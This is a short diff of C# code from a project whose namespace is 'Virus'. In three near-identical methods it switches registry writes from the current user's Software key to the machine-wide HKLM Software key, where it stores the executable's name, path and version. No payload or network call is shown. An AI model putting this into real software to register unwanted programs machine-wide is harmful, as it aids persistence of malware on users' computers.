@@ -145,7 +145,7 @@ namespace Virus
             string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
             string AppPath = Application.ExecutablePath;
             string AppVersion = "1.0";
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
 
             key.CreateSubKey(AppTitle);
             key = key.OpenSubKey(AppTitle, true);
@@ -165,7 +165,7 @@ namespace Virus
             string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
             string AppPath = Application.ExecutablePath;
             string AppVersion = "1.0";
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
 
             key.CreateSubKey(AppTitle);
             var key1 = key.OpenSubKey(AppTitle, true); //open
@@ -191,7 +191,7 @@ namespace Virus
             string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
             string AppPath = Application.ExecutablePath;
             string AppVersion = "1.0";
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
 
             key.CreateSubKey(AppTitle);
             var key1 = key.OpenSubKey(AppTitle, true); //open
